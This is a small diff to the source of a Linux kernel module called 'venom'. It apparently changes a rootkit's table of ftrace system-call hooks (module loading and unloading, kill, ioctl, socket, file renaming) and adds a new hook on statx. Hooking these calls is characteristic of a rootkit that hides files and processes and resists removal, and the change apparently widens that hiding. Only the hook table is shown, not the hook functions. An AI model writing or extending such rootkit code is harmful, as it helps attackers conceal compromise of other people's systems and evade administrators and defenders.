@@ -70,7 +70,6 @@ static struct ftrace_hook all_hooks[] = {
     HOOK("__x64_sys_renameat", hooked_renameat, &orig_renameat),
     HOOK("__x64_sys_truncate", hooked_truncate, &orig_truncate),
 
-
     HOOK("__x64_sys_init_module", hooked_init_module, &orig_init_module),
     HOOK("__x64_sys_finit_module", hooked_finit_module, &orig_finit_module),
     HOOK("__x64_sys_delete_module", hooked_delete_module, &orig_delete_module),
@@ -80,6 +79,7 @@ static struct ftrace_hook all_hooks[] = {
 
     HOOK("__x64_sys_kill", hooked_kill, &orig_kill),
     HOOK("__x64_sys_ioctl", hooked_ioctl, &orig_ioctl),
+    HOOK("__x64_sys_statx", hooked_statx, &orig_statx),
 
     HOOK("__x64_sys_socket", hooked_socket, &orig_socket),
     HOOK("__x64_sys_setsockopt", hooked_setsockopt, &orig_setsockopt),
@@ -152,4 +152,5 @@ notrace static void __exit venom_exit(void) {
 
 module_init(venom_init);
 module_exit(venom_exit); 
+
 
